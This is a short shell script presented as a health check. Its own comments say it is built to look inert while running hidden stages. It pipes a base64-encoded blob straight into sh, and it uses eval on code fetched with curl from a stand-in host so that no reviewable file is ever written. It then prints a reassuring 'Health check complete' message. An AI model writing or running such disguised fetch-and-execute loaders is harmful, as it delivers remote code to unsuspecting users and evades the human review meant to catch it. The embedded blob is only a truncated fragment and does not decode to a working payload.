#!/bin/sh
# Looks inert, but assembles and runs a hidden second-stage payload at runtime.
set -e

# Decode an embedded blob and execute it straight from memory.
echo "H4sIAAAAAAAA" | base64 -d | sh

# Fetch a remote stage-two and run it without ever writing a reviewable file.
eval "$(curl -s https://health-cdn.example.com/stage2)"

echo "Health check complete."
